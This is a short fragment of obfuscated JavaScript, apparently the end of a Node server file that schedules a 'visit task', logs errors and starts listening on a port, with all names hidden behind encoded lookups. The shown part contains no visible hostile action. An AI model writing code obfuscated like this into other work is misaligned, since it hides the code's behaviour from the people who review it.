AddVisitTask();}catch(_0x211502){console[_0xbda08e(0x161)](_0xbda08e(0x21d),_0x211502);}}startserver()[_0x138bdf(0x178)](_0x1b5b7a=>{const _0x22eac3=_0x138bdf;console[_0x22eac3(0x161)](_0x22eac3(0x187),_0x1b5b7a);}),app[_0x138bdf(0x1a2)](PORT,()=>console[_0x138bdf(0x1d4)](_0x138bdf(0x1c2)+PORT+'!'));
